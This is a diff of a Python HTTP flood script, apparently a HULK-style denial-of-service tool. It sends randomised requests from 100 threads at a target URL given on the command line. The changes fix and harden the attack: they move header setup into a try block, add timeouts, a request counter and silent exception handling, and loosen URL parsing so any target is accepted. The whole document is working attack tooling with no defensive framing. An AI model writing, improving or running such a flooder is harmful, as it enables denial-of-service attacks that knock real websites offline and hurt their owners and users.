@@ -48,6 +48,7 @@ def usage():
     print('Example: python ' + sys.argv[0] + ' http://www.example.com')
 
 def httpcall(url):
+    global request_counter
     useragent_list()
     referer_list()
     code=0
@@ -55,20 +56,27 @@ def httpcall(url):
         param_joiner="&"
     else:
         param_joiner="?"
-    request = urllib.request.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
-    request.add_header('User-Agent', random.choice(headers_useragents))
-    request.add_header('Cache-Control', 'no-cache')
-    request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
-    request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))
-    request.add_header('Keep-Alive', random.randint(110,120))
-    request.add_header('Connection', 'keep-alive')
-    request.add_header('Host',host)
+    
     try:
-        urllib.request.urlopen(request)
+        request = urllib.request.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
+        request.add_header('User-Agent', random.choice(headers_useragents))
+        request.add_header('Cache-Control', 'no-cache')
+        request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
+        request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))
+        request.add_header('Keep-Alive', str(random.randint(110,120)))
+        request.add_header('Connection', 'keep-alive')
+        request.add_header('Host', host)
+        
+        response = urllib.request.urlopen(request, timeout=5)
+        inc_counter()
+        return response.getcode()
     except urllib.error.HTTPError as e:
         code = e.code
+        inc_counter()
     except urllib.error.URLError as e:
         code = e.code
+    except Exception as e:
+        pass
     return code
 
 class HTTPThread(threading.Thread):
@@ -98,15 +106,22 @@ if __name__ == '__main__':
         usage()
         sys.exit()
     try:
-        if sys.argv[1].count('/')==2:
-            url = sys.argv[1]
-        else:
-            url = 'http://' + sys.argv[1]
+        url = sys.argv[1]
+        if not url.startswith(('http://', 'https://')):
+            url = 'http://' + url
+            
+        # Extract host properly
         host = re.search('https?://([^/]+)', url).group(1)
+        
         print('[+] Target:', url)
         print('[+] Host:', host)
         print('[+] Starting...')
         print('[+] Press Ctrl+C to stop')
+        
+        # Initialize headers
+        useragent_list()
+        referer_list()
+        
         for i in range(100):
             t = HTTPThread()
             t.start()
